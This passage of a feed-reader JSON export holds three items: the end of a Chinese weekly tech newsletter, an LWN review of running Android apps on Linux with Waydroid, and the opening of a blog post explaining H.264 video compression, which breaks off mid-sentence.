href=\"https://github.com/ruanyf/weekly/issues/2446\">@Barenboim</a> 投稿）</p>\n\n<p>5、<a href=\"https://doc.fastgit.org/zh-cn/guide.html\">FastGit</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061504.webp\" alt=\"\" title=\"\"></p>\n\n<p>GitHub 有时在国内不容易打开，这里有一个服务是 GitHub 的镜像加速器。提醒一下，如果要登陆 GitHub，使用这种服务会有安全顾虑，大家自己权衡。（<a href=\"https://github.com/ruanyf/weekly/issues/2448\">@dllen</a> 投稿）</p>\n\n<p>6、<a href=\"http://ldapdoc.eryajf.net/\">Go-Ldap-Admin</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061505.webp\" alt=\"\" title=\"\"></p>\n\n<p>一个国产软件，基于 Go+Vue 实现的 openLDAP 管理后台，可以作为打通 IM（钉钉、企业微信、飞书）与支持 ldap 认证的应用的桥梁。（<a href=\"https://github.com/ruanyf/weekly/issues/2450\">@eryajf</a> 投稿）</p>\n\n<p>7、<a href=\"https://japa.dev/\">Japa</a></p>\n\n<p>一个 Node.js 的测试框架，简单快速，功能也很多，而且可以直接运行测试脚本，不必通过测试框架来运行。</p>\n\n<p>8、<a href=\"https://github.com/xataio/screenshot\">@xata.io/screenshot</a></p>\n\n<p>这个网页脚本可以生成当前页面的截图。</p>\n\n<p>9、<a href=\"https://www.gitkraken.com/gitlens/features\">GitLens</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202203/bg2022031915.webp\" alt=\"\" title=\"\"></p>\n\n<p>一个 VSCode 的插件，大大增强了 Git 集成，可以在编辑器里面执行很多 Git 操作，特别适合多人合作的项目。</p>\n\n<h2>Deno 框架</h2>\n\n<p>Deno 是 JavaScript 语言的服务器运行环境，跟 Node.js 是竞争关系。</p>\n\n<p>Deno 本身的开发已经接近稳定了，下一步只要有一个好用的框架，就能推广了。</p>\n\n<p>1、<a href=\"https://fresh.deno.dev/\">Fresh 框架</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061401.webp\" alt=\"\" title=\"\"></p>\n\n<p>上周，基于 Deno 的 Fresh 框架发布了预览。</p>\n\n<p>该框架直接使用 TypeScript 脚本，号称零配置、零构建，页面由服务端渲染，客户端不需要 JS 生成内容，也没有多余的 JS 脚本，追求小而快，值得关注。</p>\n\n<p>2、<a href=\"https://alephjs.org/\">Aleph.js</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061402.webp\" alt=\"\" title=\"\"></p>\n\n<p>Aleph.js 是另一个基于 Deno 的全栈框架，类似于 Next.js，目前处于早期开发阶段，也可以关注。</p>\n\n<p>3、<a href=\"https://expressjs.com/\">Express</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061403.webp\" alt=\"\" title=\"\"></p>\n\n<p>顺便提一下，老牌的 Node.js 框架 Express，最近要发布5.0版了。这是一件大事，因为4.0版是八年前发布的。这篇文章介绍了<a href=\"https://fusebit.io/blog/new-express-5-features/\">5.0版的新特性</a>。</p>\n\n<h2>可视化作品</h2>\n\n<p>1、<a href=\"http://he.net/3d-map/\">全球海底光缆</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022041001.webp\" alt=\"\" title=\"\"></p>\n\n<p>这个网页提供了一个互动式的地球，上面有全世界海底光缆和骨干机房的位置。</p>\n\n<p>2、<a href=\"https://www.drawaurora.com/\">极光</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022041002.webp\" alt=\"\" title=\"\"></p>\n\n<p>这个网页构造了一个极地的背景，让你手绘动态的极光效果。</p>\n\n<p>3、<a href=\"https://persepolis.getty.edu/\">波斯波利斯</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022041004.webp\" alt=\"\" title=\"\"></p>\n\n<p>波斯波利斯是古代波斯帝国的首都，位于现在的伊朗，已经是一片废墟了。这个页面还原了这座雄伟的帝国都城，重建了 3D 街景，让你在其中漫游。</p>\n\n<h2>图片</h2>\n\n<p>1、<a href=\"https://zh.wikipedia.org/wiki/%E9%B9%B9%E6%B5%B7\">咸海</a></p>\n\n<p>哈萨克斯坦曾经有一个巨大的湖泊，叫做咸海，面积68000平方公里，相当于两个海南岛，是世界第四大湖泊。</p>\n\n<p>但是，从1960年代开始，前苏联建造了很多灌溉工程，从咸海大量引水，又没有补充，导致咸海快速干涸，目前已经接近消失了。</p>\n\n<p>1985年的咸海。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022001.webp\" alt=\"\" title=\"\"></p>\n\n<p>1997年的咸海。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022002.webp\" alt=\"\" title=\"\"></p>\n\n<p>2014年的咸海。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022003.webp\" alt=\"\" title=\"\"></p>\n\n<p>2、<a href=\"https://www.houseporn.ca/landscape/article/the_wall_housing_structure_in_fermont_quebec\">住宅墙</a></p>\n\n<p>加拿大有一个小镇，靠近北极，终年刮着强劲的北风。</p>\n\n<p>为了挡风，当地修建了高50米，长1.3公里的挡风墙，同时这堵墙里面还是住宅、商业和教育设置，里面可以住人。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022006.webp\" alt=\"\" title=\"\"></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022007.webp\" alt=\"\" title=\"\"></p>\n\n<p>因为有了这堵住宅墙，小镇居民就拥有了一个无风的、温暖的小气候。 </p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022008.webp\" alt=\"\" title=\"\"></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022009.webp\" alt=\"\" title=\"\"></p>\n\n<h2>文摘</h2>\n\n<p>1、<a href=\"https://www.ifanr.com/app/1448161\">如何增加牙膏的销量</a></p>\n\n<p>1950年代，一家国外的牙膏公司，向公众征求能够大幅提高销售额的点子。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022020805.webp\" alt=\"\" title=\"\"></p>\n\n<p>几天之后，有一个人来应征，声称他有办法让销售额快速增长40%，而且实施起来不需要很大成本。他要价10万美元。</p>\n\n<p>公司管理层犹豫了数周，最后还是同意了给钱。</p>\n\n<p>等到法律手续和付款流程完成后，这个人给出装有一张小纸条的信封，小纸条上只有四个英文单词：</p>\n\n<blockquote>\n  <p>\"Make The Hole Bigger\"</p>\n</blockquote>\n\n<p>这句话翻译成中文，就是\"让牙膏开口更大一点\"。</p>\n\n<p>此前，管状牙膏的开口一般是5毫米直径。稍加计算就可以知道，当直径从5毫米增加到6毫米时，假设挤出的牙膏长度不变，挤出量会增加44%。</p>\n\n<p>原先顾客用一管牙膏的时间，现在要1.4管牙膏才能满足需求。看似很小的改变，却刷新了这家公司的销售记录，创造了历史。</p>\n\n<h2>言论</h2>\n\n<p>1、</p>\n\n<p>一件事最可怕的时刻，总是在你开始做之前。</p>\n\n<p>-- <a href=\"https://gretchenrubin.com/2016/08/according-stephen-king-scariest-moment-always-____\">斯蒂芬·金</a></p>\n\n<p>2、</p>\n\n<p>对于那些没有想象力的人来说，保持常态就是他们的理想。</p>\n\n<p>-- <a href=\"https://quotefancy.com/quote/782361/C-G-Jung-Normality-is-a-fine-ideal-for-those-who-have-no-imagination\">荣格</a></p>\n\n<p>3、</p>\n\n<p>IT 行业与传统制造业有一个重要区别，就是 IT 行业有着严重的垄断。</p>\n\n<p>全世界的智能手机有70亿部，比汽车多出5倍（14亿辆）。但是，智能手机制造商比汽车制造商少了好几个数量级。搜索引擎、社交网络、操作系统都是这样，几个巨头就垄断了整个市场。</p>\n\n<p>-- <a href=\"https://news.ycombinator.com/item?id=28896320\">Hacker News 读者</a></p>\n\n<p>4、</p>\n\n<p>电动汽车虽然售价高，但是每公里的行驶成本低，因此用得越久越划算。这就要求汽车厂商制造耐用的电动汽车。</p>\n\n<p>-- <a href=\"https://news.ycombinator.com/item?id=30914512\">Hacker News 读者</a></p>\n\n<p>5、</p>\n\n<p>2021年只有两种人在写博客，一种是试图建立受众并从中获利的人，另一种是只想写出想法、而没有任何目标的人。</p>\n\n<p>这两种人的行为都非常好。选择做你喜欢的事，坚持下去，它们最终都可以对他人产生价值。</p>\n\n<p>-- <a href=\"https://bhupesh.me//what-i-have-learned-from-blogging-so-far-retrospect/\">《我从博客中学到的东西》</a></p>\n\n<h2>历史上的本周</h2>\n\n<p>2021年（第 162 期）：<a href=\"https://www.ruanyifeng.com/blog/2021/06/weekly-issue-162.html\">生活就像《吃豆人》游戏</a></p>\n\n<p>2020年（第 111 期）：<a href=\"https://www.ruanyifeng.com/blog/2020/06/weekly-issue-111.html\">智能电视的误区</a></p>\n\n<p>2019年（第 60 期）：<a href=\"https://www.ruanyifeng.com/blog/2019/06/weekly-issue-60.html\">一本介绍人类起源的学术自传</a></p>\n\n<p>2018年（第 9 期）：<a href=\"https://www.ruanyifeng.com/blog/2018/06/weekly-issue-9.html\">身份证可以植入人体</a></p>\n\n<h2>订阅</h2>\n\n<p>这个周刊每周五发布，同步更新在<a href=\"http://www.ruanyifeng.com/blog\">阮一峰的网络日志</a>和<a href=\"http://weixin.sogou.com/weixin?query=%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97\">微信公众号</a>。</p>\n\n<p>微信搜索\"阮一峰的网络日志\"或者扫描二维码，即可订阅。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202103/bg2021030402.jpg\" alt=\"\" title=\"\"></p>\n\n<p>（完）</p>\n<div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href=\"https://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr title=\"2022-06-17T08:37:40+08:00\">2022年6月17日</abbr></li>\n\n</ul></div><div></div>"
    },
    "origin": {
        "streamId": 25,
        "title": "阮一峰的网络日志",
        "htmlUrl": "http://www.ruanyifeng.com/blog/",
        "feedUrl": "https://feeds.feedburner.com/ruanyifeng"
    }
},
{
    "id": "901459",
    "timestampUsec": "1658250792213488",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Android apps on Linux with Waydroid",
    "author": ";jake",
    "published": 1658248860,
    "updated": 1658248860,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/901459/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           <p>July 19, 2022</p>\n           <p>This article was contributed by Sam Sloniker</p>\n           </div>\n<p>It is not uncommon for users to want to run a program targeted to one\noperating system on another type of system. With the increasing prevalence of\nsmartphones, Android has become the world's most widely used operating\nsystem. So users may want to run Android apps on Linux systems in order\nto get access to a game or other app that is not available in a\nLinux version or to develop mobile apps on their desktop system.\nThe <a href=\"https://waydro.id/\">Waydroid</a> project provides a way to run those\napps on Linux, which means they can run on a variety of devices, including\nLinux-based smartphones like <a href=\"https://lwn.net/Articles/883073\">the PinePhone</a>.  </p>\n\n<p>Waydroid is similar in concept to the Windows compatibility layer <a href=\"https://winehq.org/\">Wine</a>. The fact that Android runs on the Linux\nkernel makes properly running Android apps on other Linux systems much\nsimpler than doing so for Windows software. It is not possible to simply run\nAndroid apps directly on a regular Linux operating system, though, because\nthey depend on a different user-space environment. However, by using kernel features such as\nnamespaces, it is possible to run the entire Android user space in a\ncontainer on a Linux system.  This is the\ntechnique used by Waydroid; it runs a complete Android system in a\ncontainer in much the same way that it is possible to, for example, run\nDebian in a container on Fedora. That allows Waydroid to have better\nperformance than it would have running in a virtual machine or an emulator. </p>\n\n<a href=\"https://lwn.net/Articles/901578#homescreen\">\n<img src=\"https://static.lwn.net/images/2022/waydroid-pinephone-homescreen-sm.png\" border=\"0\" hspace=\"5\" align=\"right\" width=\"150\" height=\"300\" alt=\"[Home screen on PinePhone]\" title=\"Home screen on PinePhone\">\n</a>\n\n<p>Waydroid runs a custom build of the <a href=\"https://lineageos.org/\">LineageOS</a> Android distribution. It has all of\nthe software features of LineageOS, though it does not emulate all device\nfeatures. For example, cameras and telephony features are not supported; WiFi and Bluetooth\ncannot be configured from within Waydroid either.\nNetworking is\nsupported, however; Waydroid always shows an Ethernet connection, which actually\nroutes traffic through the host. \nAudio input and output both\nwork using the host's configured audio paths.\n Other than these and a few other minor differences,\nWaydroid is mostly similar \nto a regular Android device without Google apps.  </p>\n\n<h4>Hardware support</h4>\n\n<p>Waydroid supports 32-bit and 64-bit x86 and Arm. 64-bit Arm has the best\napp support, because it is the architecture used by the vast majority of\nregular Android devices, but many apps do also work on 64-bit x86.\nI did not test any 32-bit\ndevices, though.\n Many apps are\nwritten entirely in Java and/or Kotlin, both of which compile to\narchitecture-independent Java virtual machine (JVM) bytecode; these apps work on all architectures\nwithout any extra effort from the developer. Other apps include native code\ncompiled from languages like C or C++; these apps must be compiled for each\nplatform, but many developers still build for x86 because most\nChromebooks, many of which have x86 processors, also support Android apps.  </p>\n\n<p>Intel and AMD GPUs, as well as the GPUs integrated into most Arm SoCs,\nare supported for hardware graphics acceleration. NVIDIA GPUs are not\nsupported  (other than the GPUs\nin Tegra Arm SoCs), but Waydroid does support software\nrendering as a workaround.  </p>\n\n<p>I tested Waydroid on my PinePhone (64-bit Arm, running DanctNIX with\nPhosh), two laptops (Dell Inspiron and Lenovo IdeaPad 3,\nboth x86-64 running Arch Linux), and my tablet (Microsoft\nSurface Go 2, also x86-64 with Arch); all of the devices have\ntouchscreens. I used Wayland on all four, \nbecause Waydroid requires it.   </p>\n\n<p>Unsurprisingly, the overall experience is best on the phone. The\nexperience with Waydroid on the PinePhone is not much different from using\na regular Android phone, other than the limitations of Waydroid that are\nnot present in normal Android devices, such as telephony and the camera not\nworking. Because the PinePhone's hardware is slower than most other\nAndroid devices, I disabled user-interface animations.  This is an issue with the\nhardware, however, not with Waydroid. After disabling animations, Waydroid is almost\nas responsive as an actual Android phone.  </p>\n\n<a href=\"https://lwn.net/Articles/901578#laptop\">\n<img src=\"https://static.lwn.net/images/2022/waydroid-laptop-2048-sm.png\" border=\"0\" hspace=\"5\" align=\"left\" width=\"300\" height=\"168\" alt=\"[2048 game on laptop]\" title=\"2048 game on laptop\">\n</a>\n\n<p>Waydroid also works quite well on the laptops. Because most apps are not\noptimized for use with a keyboard and mouse, I use the laptops'\ntouchscreens much more in Waydroid than I do with regular Linux software.\nQuite a few apps are designed to support\nkeyboard and mouse input for compatibility with Chromebooks, so those tend\nto work even better. The experience would be much worse on a desktop or a\nnon-touch laptop, but \nChromebook-optimized apps would still work well.  </p>\n\n<p>On the tablet, touch gestures did not work properly (a swipe was\nregistered as a long tap at a single point), though they work fine in Linux\nitself; this made Waydroid almost\nunusable on the tablet. Because of this problem, I did not do much\ntesting. Surface devices often have problems with Linux, though, so it is likely\nthat this is a device-specific issue (possibly even specific to my software\nsetup) rather than a general problem with Waydroid on tablets.  </p>\n\n<p>Waydroid does not work with the default kernel provided by some\ndistributions because it requires the <tt>binder</tt> and <tt>ashmem</tt>\nmodules. It appears that Ubuntu and Debian both provide these modules by\ndefault, while Fedora and Arch do not.  I did not check any other\ndistributions. On the laptop and tablet, I installed <a href=\"https://archlinux.org/packages/testing/x86_64/linux-zen/\"><tt>linux-zen</tt></a>, \nwhich is an alternative kernel available for Arch that\ndoes provide the modules. The default kernel used in DanctNIX on the PinePhone provides\nthem, so I did not have to replace its kernel.  </p>\n\n<p>\nThe process for installing and running Waydroid varies depending on the  distribution.\nI followed the <a href=\"https://wiki.archlinux.org/title/Waydroid\">instructions on the Arch\nwiki</a> for the laptops, so I installed <tt>waydroid</tt> and <tt>waydroid-image</tt> from\nthe <a href=\"https://aur.archlinux.org/\">Arch User Repository</a> (AUR)\nafter installing the Zen kernel.  After that, Waydroid had to be initialized\nwith \"<tt>sudo waydroid init</tt>\" and the\n<tt>waydroid-container</tt> service needed to be enabled and started for\nsystemd.  The <a href=\"https://docs.waydro.id/\">Waydroid\ndocumentation</a> has <a href=\"https://docs.waydro.id/usage/install-on-desktops\">instructions</a>\nfor installing it on other distributions.\n</p> \n\n<p>Waydroid has two modes, multi-window mode and full user interface (UI) mode. When\nmulti-window mode works properly, Android apps are integrated into the\ndesktop as if they were Linux desktop apps. On all four devices, however,\nmulti-window mode has several bugs that made it difficult to use, so I only\nuse full UI mode. This runs the entire Android UI in a single window. \n</p>\n\n<p>\nWaydroid creates <tt>.desktop</tt> files for every app installed, including\nthe default system apps, and this cannot be disabled. These desktop entries\nlaunch the apps in multi-window mode. If you only use full UI mode,\nhowever, they just create unnecessary clutter in the menus. The icons can\nbe hidden by \nadding <tt>Hidden=true</tt> to the end of each <tt>waydroid.*.desktop</tt>\nfile in <tt>~/.local/share/applications</tt>.  Deleting the\n<tt>.desktop</tt> files is futile, because Waydroid will simply create them\nagain the next time it is started.</p>\n\n<h4>App support</h4>\n\n<p>As would be expected, app support is best on the PinePhone, both because\nit is an Arm device and because most Android apps are primarily designed\nfor phones.  On the laptop, most apps are usable, although mouse support is\nincomplete in many apps; the touchscreen works fine.  </p>\n\n<a href=\"https://lwn.net/Articles/901578#fdroid\">\n<img src=\"https://static.lwn.net/images/2022/waydroid-pinephone-fdroid-sm.png\" border=\"0\" hspace=\"5\" align=\"right\" width=\"150\" height=\"300\" alt=\"[F-Droid]\" title=\"F-Droid\">\n</a>\n\n<p>One of the most significant differences between Waydroid and a typical\nAndroid device is its lack of Google apps. This is certainly beneficial for\nprivacy, but it does have some drawbacks. Many apps cannot be installed or\nwill not work properly without Google apps and services.  </p>\n\n<p>The Google Play Store is not available, significantly limiting the\nnumber of apps available to install. Many apps that would otherwise work\nfine in Waydroid, especially proprietary\nones, cannot easily be installed\nbecause they are only distributed through the Play Store. </p>\n\n<p><a href=\"https://f-droid.org/\">F-Droid</a> works well in Waydroid, and\ndoes have good mouse support. The vast majority of apps listed with no\n\"anti-features\" will work, and many with anti-features also work. The\nanti-feature most likely to cause problems is \"non-free dependencies\":\noften, the non-free software that this anti-feature refers to is Google\nPlay Services. This can cause problems ranging from no push notifications\nor missing maps to apps that do not even open.  Of course, apps that depend\non unsupported hardware features will not work properly regardless of\nwhether or not they have any anti-features. \n</p>\n\n<p>It appears to be possible to make some of these apps work by installing <a href=\"https://microg.org/\">microG</a>, but I did not test this due to\nconcerns that using it may violate the <a href=\"https://play.google.com/about/play-terms/index.html\">Terms of\nService</a> for Google Play. <a href=\"https://f-droid.org/en/packages/com.aurora.store/\">Aurora Store</a>\nis an alternative Play Store client that most likely works in Waydroid and\ncould be used to install many Play-Store-only apps; I did not test it\neither for the same reason.  </p>\n\n<p>One limitation of Waydroid is that when a link is clicked in an Android\napp, there is no option to open the link in the host browser without\ninstalling additional software. There is <a href=\"https://github.com/waydroid/waydroid/issues/210\">an open issue on the\nWaydroid repository for this</a>, but as a workaround until this feature is\nadded, I wrote a <a href=\"https://git.kj7rrv.com/kj7rrv/passthroughbrowser\">Python script and\nAndroid app</a> to add it. The Android app is installed in the Waydroid\ncontainer and set as the default browser (although it is not really a\nbrowser, it is configured to appear in the list of available browsers),\nwhile the Python script runs on the host OS. When a link is clicked in an\nAndroid app, the \"browser\" connects to the Python script, which then opens\nthe real browser on the host.  </p>\n\n<p>\nWaydroid development takes place in a <a href=\"https://github.com/waydroid\">GitHub repository</a>. The\nproject's Web site <a href=\"https://waydro.id/#team\">lists three members of the\ndevelopment team</a>, and GitHub currently shows 25 contributors to <a href=\"https://github.com/waydroid/waydroid\">the main\nrepository</a>. The latest release is <a href=\"https://github.com/waydroid/waydroid/releases/tag/1.2.1\">v1.2.1</a>,\nwhich came out\nin April, but there has been quite a bit of development since\nthen. Overall, releases\nhave been somewhat sporadic; v1.1.0, the first release listed on GitHub, was published in\nSeptember 2021, followed by v1.1.1 two days later. The next release,\nv1.2.0, came out a month after that, then there were no releases between\nOctober and April.\n</p>\n\n<h4>Conclusion</h4>\n\n<p>Overall, despite some issues and drawbacks, Waydroid is a useful way to\nrun Android apps on Linux, especially on non-Android Linux phones. Like any\nsoftware, it has some bugs, but most of its problems are caused by the\ninherent differences between a computer running only or almost only FOSS\nand a smartphone with large amounts of proprietary software; services\nconsidered essential on most Android devices are missing in Waydroid. And,\nwhen it is used on a desktop or laptop, the input devices (keyboard and\nmouse) are fundamentally different from the touchscreens that Android (and most of its\napps) are primarily designed for. The Android UI and many\napps already have good keyboard and mouse support for compatibility with\nChromebooks, but it is still quite evident that Android is primarily designed for smartphones.  </p>\n\n<p>Unfortunately, devices without Google Play Services and the Play Store are so rare that\nthere is little incentive for developers to avoid using Play Services or to\npublish their apps in alternative channels; the\nprimary exceptions are developers of FOSS and/or privacy-focused apps. Of\ncourse, some Linux users would not want to use other apps anyway, so this\nmay not be an issue for a lot of Waydroid users.  </p>\n\n<p>Even with these limitations, Waydroid significantly expands the range of\nsoftware available to Linux users, especially those with Linux\nsmartphones. Of course, it is not an ideal solution, just as Wine is not an ideal\nsolution to the shortage of Linux desktop software; it would certainly be\nbetter to have more native mobile-Linux apps. Overall, however,\nWaydroid is quite useful to Linux phone users who do not want to be limited\nto the few native apps designed for Linux phones.   Waydroid is definitely\nworth trying on any device where one wants to be able to run Android apps.\n</p><br clear=\"all\"><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Archives/GuestIndex/\">GuestArticles</a></td><td><a href=\"https://lwn.net/Archives/GuestIndex/#Sloniker_Sam\">Sloniker, Sam</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "5d6fdd6ab4388b00176164dc",
    "timestampUsec": "1658511234232333",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "H.264 is Magic",
    "author": ";Sid Bala",
    "published": 1478117940,
    "updated": 1478117940,
    "alternate": [
        {
            "href": "https://sidbala.com/h-264-is-magic/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>H.264 is a video compression codec standard. It is ubiquitous - internet video, Blu-ray, phones, security cameras, drones, everything. Everything uses H.264 now.</p>\n<p>H.264 is a remarkable piece of technology. It is the result of 30+ years of work with one single goal: To reduce the bandwidth required for transmission of full-motion video.</p>\n<p>Technically, it is very interesting. This post will give insight into some of the details at a high level - I hope to not bore you too much with the intricacies. Also note that many of the concepts explained here apply to video compression in general, and not just H.264.</p>\n<blockquote>\n<p>Why even compress anything?</p>\n</blockquote>\n<p>A simple uncompressed video file will contain an array of 2D buffers containing pixel data for each frame. So it's a 3D (2 spatial dimensions and 1 temporal) array of bytes. Each pixel takes 3 bytes to store - one byte each for the three primary colors (red, green and blue).</p>\n<p>1080p @ 60 Hz = 1920x1080x60x3 =&gt; ~<strong>370 MB/sec</strong> of raw data.</p>\n<p>This is next to impossible to deal with. A 50GB Blu-ray disk will only hold ~2 mins. You can't move it anywhere fast. Even SSDs have trouble dumping this straight from RAM to Disk[^1].</p>\n<p>So yeah. We need compression.</p>\n<blockquote>\n<p>Why <em>H.264</em> compression?</p>\n</blockquote>\n<p>Yes, I will answer this. But first let me show you something. Here is the Apple Homepage:</p>\n<p><img src=\"https://sidbala.com/content/images/2016/11/HomePage.png\" alt loading=\"lazy\"></p>\n<p>I captured the screen of this home page and produced two files:</p>\n<ul>\n<li><a href=\"https://sidbala.com/content/images/2016/11/outputFrame.png\">PNG screenshot of the Apple homepage</a> <strong>1015KB</strong></li>\n<li><a href=\"https://s3-us-west-2.amazonaws.com/sidbala-blog/VideoH264.mp4\">5 Second 60fps H.264 video of the same Apple homepage</a> <strong>175KB</strong></li>\n</ul>\n<blockquote>\n<p>Eh. What? Those file sizes look switched.</p>\n</blockquote>\n<p>No, they're right. The H.264 video, 300 frames long is 175KB. A single frame of that video in PNG is 1015KB.</p>\n<p>It looks like we're storing 300 times the amount of data in the video. But the file size is a fifth. So H.264 would seem to be 1500x as efficient as PNG.</p>\n<blockquote>\n<p>How is this even possible? All right, what's the trick?</p>\n</blockquote>\n<p>There are very many tricks! H.264 uses all the tricks you can think of (and tons you can't think of). Let's go through the important ones.</p>\n<h6>Shedding weight</h6>\n<p>Imagine you're building a car for street racing. You need to go faster. What is the first thing you do? You shed some weight. Your car weighs 3000 lbs. You throw away stuff you don't need. Those back seats? pfft. Chuck those. That subwoofer? Gone. No music for you. Air Conditioning? Yeah, ditch it. Transmission? Ye..no. Wait! We're gonna need that.</p>\n<p>You remove everything except the things that matter.</p>\n<p>This concept of throwing away bits you don't need to save space is called <strong>lossy</strong> compression. H.264 is a lossy codec - it throws away less important bits and only keeps the important bits.</p>\n<p>PNG is a <strong>lossless</strong> codec. It means that nothing is thrown away. Bit for bit, the original source image can be recovered from a PNG encoded image.</p>\n<blockquote>\n<p>Important bits? How does the algorithm know what bits in my frame are important?</p>\n</blockquote>\n<p>There are few obvious ways to trim out images. Maybe the top right quadrant is useless all the time. So maybe we can zero out those pixels and discard that quadrant. We would use only 3/4th of the space we need. ~2200 lbs now. Or maybe we can crop out a thick border around the edges of the frame, the important stuff is in the middle anyway. Yes, you could do these. But H.264 doesn't do this.</p>\n<blockquote>\n<p>What does H.264 actually do?</p>\n</blockquote>\n<p>H.264, like other lossy image algorithms, discards detail information. Here is a close-up of the original compared with the image post-discard.</p>\n<p><img src=\"https://sidbala.com/content/images/2016/11/CompressedImage-1.jpg\" alt loading=\"lazy\"></p>\n<p>See how the compressed one does not show the holes in the speaker grills in the MacBook Pro? If you don't zoom in, you would even notice the difference. The image on the right weighs in at <strong>7%</strong> the size of the original - and we haven't even compressed the image in the traditional sense. Imagine your car weighed just 200 lbs!</p>\n<blockquote>\n<p>7% wow! How do you discard detail information like that?</p>\n</blockquote>\n<p>For this we need a quick math lesson.</p>\n<h6>Information Entropy</h6>\n<p>Now we're getting to the juicy bits! Ha puns! If you took an information theory class, you might remember information entropy. Information entropy is the number of bits required to represent some information. Note that it is not simply the size of some dataset. It is minimum number of bits that must be used to represent all the information contained in a dataset.</p>\n<p>For example, if your dataset is the result of a single coin toss, you need 1 bit of entropy. If you have record two coin tosses, you'll need 2 bits. Makes sense?</p>\n<p>Suppose you have some strange coin - you've tossed it 10 times, and every time it lands on heads. How would you describe this information to someone? You wouldn't say HHHHHHHHH. You would just say \"10 tosses, all heads\" - bam! You've just compressed some data! Easy. I saved you hours of mindfuck lectures. This is obviously an oversimplification, but you've transformed some data into another shorter representation of the same information. You've reduced data <strong>redundancy</strong>. The information entropy in this dataset has not changed - you've just converted between representations. This type of encoder is called an <strong>entropy encoder</strong> - it's a general-purpose lossless encoder that works for any type of data.</p>\n<h6>Frequency Domain</h6>\n<p>Now that you understand information entropy, let's move on to transformations of data. You can represent data in some fundamental units. If you use binary, you have 0 and 1. If you use hex, you have 16 characters. You can easily transform between the two systems. They are essentially equivalent. So far so good? Ok!</p>\n<p>Now, some imagination! Imagine you can transform any dataset that varies over space(or time) - something like the brightness value of an image, into a different coordinate space. So instead of x-y coordinates, let's say we have frequency coordinates. freqX and freqY are the axes now. This is called a <strong>frequency domain</strong> representation. There is another mindfuck mathematical theorem[^2] that states that you can do this for any data and you can achieve a perfect lossless transformation as long as freqX and freqY are high enough.</p>\n<blockquote>\n<p>Okay, but what the freq are freqX and freqY?</p>\n</blockquote>\n<p>freqX and freqY are some other set of basis units. Just like when we switch from binary to hex, we have a different fundamental unit, we're switching from the familiar X-Y to freqX and freqY. Hex 'A' looks different from binary '1010'. Both mean the same thing, but <strong>look</strong> different. So here is what our image looks like in the frequency domain:</p>\n<p><img src=\"https://sidbala.com/content/images/2016/11/BasicFFT-2.png\" alt loading=\"lazy\"></p>\n<p>The fine grill on that MacBook pro has a high information content in the higher frequency components of that image. Finely varying content = high frequency components. Any sort of gradual variation in the color and brightness - such as gradients are low frequency components of that image. Anything in between falls in between. So fine details = high freq. Gentle gradients = low freq. Makes sense?</p>\n<p>In the frequency domain representation, the low frequency components are near the center of that image. The higher frequency components are towards of the edges of the image.</p>\n<blockquote>\n<p>Okay. Kinda makes sense. But why do all this?</p>\n</blockquote>\n<p>Because now, you can take that frequency domain image and then mask out the edges - discard information which will contain the information with high frequency components. Now if you convert back to your regular x-y coordinates, you'll find that the resulting image looks similar to the original but has lost some of the fine details. But now, the image only occupies a fraction of the space. By controlling how big your mask is, you can now tune precisely how detailed you want your output images to be.</p>\n<p>Here is the close-up of the laptop in the home page again. Except now, there is a circular border mask that's been applied.</p>\n<p><img src=\"https://sidbala.com/content/images/2016/11/QuantizationHorizontalWithMasks-1.jpg\" alt loading=\"lazy\"></p>\n<p>The numbers represent the information entropy of that image as a fraction of the original. Even at 2%, you won't notice the difference unless you're at this zoom level. 2%! - your car now weighs 60 lbs!</p>\n<p>So that's how you shed weight. This process in lossy compression is called <strong>quantization</strong>[^3].</p>\n<blockquote>\n<p>Okay. Impressive, I guess. What else you got?</p>\n</blockquote>\n<h6>Chroma Subsampling.</h6>\n<p>The human/eye brain system is not very good at resolving finer details in color. It can detect minor variations in brightness very easily but not color. So there must be some way to discard color information to shed even more weight.</p>\n<p>In a TV 